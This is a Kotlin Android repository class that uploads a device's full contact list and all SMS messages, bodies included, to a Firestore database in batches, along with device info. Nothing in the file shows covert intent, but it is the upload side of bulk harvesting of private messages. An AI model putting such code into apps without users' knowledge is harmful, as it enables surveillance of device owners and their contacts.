package com.datasync.user.data

import android.util.Log
import com.datasync.user.model.Contact
import com.datasync.user.model.Device
import com.datasync.user.model.SMS
import com.google.firebase.crashlytics.FirebaseCrashlytics
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.WriteBatch
import kotlinx.coroutines.tasks.await
import java.security.MessageDigest

class FirestoreRepository {
    private val db = FirebaseFirestore.getInstance()
    private val crashlytics = FirebaseCrashlytics.getInstance()

    suspend fun updateDeviceInfo(device: Device) {
        try {
            db.collection("devices")
                .document(device.deviceId)
                .set(device)
                .await()
        } catch (e: Exception) {
            Log.e("FirestoreRepository", "Error updating device info", e)
            crashlytics.recordException(e)
            throw e
        }
    }

    suspend fun syncContacts(deviceId: String, contacts: List<Contact>) {
        if (deviceId.isBlank()) return
        val collectionRef = db.collection("devices")
            .document(deviceId)
            .collection("contacts")

        try {
            // Use batch writes for scalability
            val chunks = contacts.chunked(500)
            for (chunk in chunks) {
                val batch = db.batch()
                chunk.forEach { contact ->
                    // Use hashed phone number as ID to prevent duplicates
                    val docId = hashString(contact.phone)
                    val docRef = collectionRef.document(docId)
                    batch.set(docRef, contact)
                }
                batch.commit().await()
            }
        } catch (e: Exception) {
            Log.e("FirestoreRepository", "Error syncing contacts", e)
            crashlytics.recordException(e)
            throw e
        }
    }

    suspend fun syncSMS(deviceId: String, smsList: List<SMS>) {
        if (deviceId.isBlank()) return
        val collectionRef = db.collection("devices")
            .document(deviceId)
            .collection("sms")

        try {
            val chunks = smsList.chunked(500)
            for (chunk in chunks) {
                val batch = db.batch()
                chunk.forEach { sms ->
                    // Use hash of address + date + body as ID to prevent duplicates
                    val docId = hashString("${sms.address}${sms.date}${sms.body}")
                    val docRef = collectionRef.document(docId)
                    batch.set(docRef, sms)
                }
                batch.commit().await()
            }
        } catch (e: Exception) {
            Log.e("FirestoreRepository", "Error syncing SMS", e)
            crashlytics.recordException(e)
            throw e
        }
    }

    private fun hashString(input: String): String {
        return MessageDigest.getInstance("SHA-256")
            .digest(input.toByteArray())
            .joinToString("") { "%02x".format(it) }
    }
}
